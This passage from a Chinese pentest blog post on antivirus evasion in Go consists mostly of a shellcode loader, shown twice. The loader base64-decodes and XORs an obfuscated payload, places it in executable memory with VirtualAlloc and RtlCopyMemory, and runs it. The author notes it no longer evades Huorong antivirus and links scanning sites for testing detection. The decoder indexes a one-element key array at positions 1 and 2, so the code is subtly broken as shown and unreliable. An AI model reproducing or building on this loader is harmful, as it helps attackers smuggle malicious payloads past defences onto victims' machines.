class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>申请内存，然后加载Shellcode到申请的内存块并执行</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载Shellcode</span></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行内存</span></span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完整代码：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32     = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll        = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line"><span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode解密</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载Shellcode</span></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行内存</span></span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>前面加密算法部分待改进，此处仅做演示。现在已过不了火绒了，下班</li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" data-caption="Go免杀初探-2"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" alt="Go免杀初探-2"></a></p><ul><li>参考文章：<ul><li><a href="https://blog.csdn.net/superjiangzhen/article/details/79938458">程序内存空间（代码段、数据段、堆栈段）</a></li><li><a href="https://yunshanwuyin.com/BlogDetail?Id=thutgzhvtyyn4ezxzps6kcfu">初探Shellcode免杀</a></li><li><a href="https://forum.butian.net/share/736">CS 免杀学习</a></li><li><a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></li><li><a href="https://github.com/aahmad097/AlternativeShellcodeExec">https://github.com/aahmad097/AlternativeShellcodeExec</a></li></ul></li><li>在线杀毒检测：<ul><li><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li><li><a href="https://www.virscan.org/">https://www.virscan.org/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
